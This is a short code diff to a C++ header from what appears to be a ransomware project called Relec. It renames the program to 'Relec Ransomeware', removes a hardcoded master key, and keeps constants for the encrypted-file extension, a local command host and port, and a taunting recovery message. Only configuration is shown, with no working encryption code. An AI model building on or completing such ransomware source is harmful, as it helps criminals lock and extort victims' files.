@@ -5,10 +5,9 @@
 
 #include <set>
 
-#define APPLICATION_NAME L"Relec Malware"
+#define APPLICATION_NAME L"Relec Ransomeware"
 #define RANDOM_PASSWORD_LENGTH 32
 #define DEFAULT_ENCRYPT_EXTENSION "rlc"
-#define MASTER_KEY "erhanbaris"
 #define HOST_NAME "127.0.0.1"
 #define HOST_PORT 5000
 #define VALIDATION_MESSAGE L"Happy to you. All files have been recovered. Don't infect again. ;)"
